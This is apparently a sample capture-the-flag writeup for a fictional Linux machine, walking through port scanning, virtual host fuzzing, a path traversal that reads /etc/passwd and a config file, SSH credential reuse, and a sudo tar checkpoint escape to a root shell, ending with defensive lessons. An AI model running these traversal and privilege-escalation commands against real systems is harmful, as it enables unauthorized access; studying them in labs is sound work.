---
title: "Sample HTB Writeup: Lantern (Fictional Linux Box)"
date: "2026-10-12"
description: "A template walkthrough for a fictional Easy Linux machine: virtual host discovery, a path traversal that leaks credentials, and a sudo misconfiguration."
category: "writeup"
platform: "HTB"
difficulty: "Easy"
tags:
  - linux
  - web
  - path-traversal
  - privilege-escalation
  - sample
featured: true
published: true
---

> [!NOTE]
> **Sample content.** "Lantern" is a fictional machine used to demonstrate the writeup layout. Replace this post with your own retired-machine writeups.

## Summary

![Attack path overview](/images/htb-sample-lantern/attack-path.svg "Attack path: enumeration, file read, credential reuse, sudo abuse.")

| Step             | Technique                         |
| ---------------- | --------------------------------- |
| Foothold         | Path traversal in a download API  |
| User             | Credential reuse over SSH         |
| Root             | `sudo tar` with checkpoint action |

## Enumeration

### Port scan

```console
$ nmap -p- --min-rate 2000 -oN scans/all 10.10.11.50
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -sC -sV -p22,80 -oN scans/detail 10.10.11.50
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://lantern.htb/
```

The redirect reveals a hostname, so it goes into `/etc/hosts`:

```bash
echo "10.10.11.50 lantern.htb" | sudo tee -a /etc/hosts
```

### Virtual hosts

```console
$ ffuf -u http://lantern.htb -H "Host: FUZZ.lantern.htb" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154
files                   [Status: 200, Size: 2311]
```

## Foothold

The `files` vhost exposes a download endpoint that takes a filename parameter. A quick test with a relative path shows it is not normalised:

```http
GET /download?name=../../../../etc/passwd HTTP/1.1
Host: files.lantern.htb
```

The response contains `/etc/passwd`, which lists a `svc` user. Reading the application's config file leaks a database password:

```console
$ curl -s "http://files.lantern.htb/download?name=../app/config.yaml"
database:
  user: lantern
  password: <redacted>
```

> [!TIP]
> When a file read works, check application configs, `.env` files and service units before going further.

## User

The database password is reused by `svc` over SSH.

```console
$ ssh svc@lantern.htb
svc@lantern:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```

## Privilege escalation

```console
svc@lantern:~$ sudo -l
User svc may run the following commands on lantern:
    (root) NOPASSWD: /usr/bin/tar
```

`tar` can execute a command at a checkpoint, a well-known [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) entry:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

## Lessons

- Normalise and confine file paths server-side; never trust a filename parameter.
- Unique credentials per service would have stopped the pivot to SSH.
- Audit `sudo` rules for binaries with known escape behaviour.
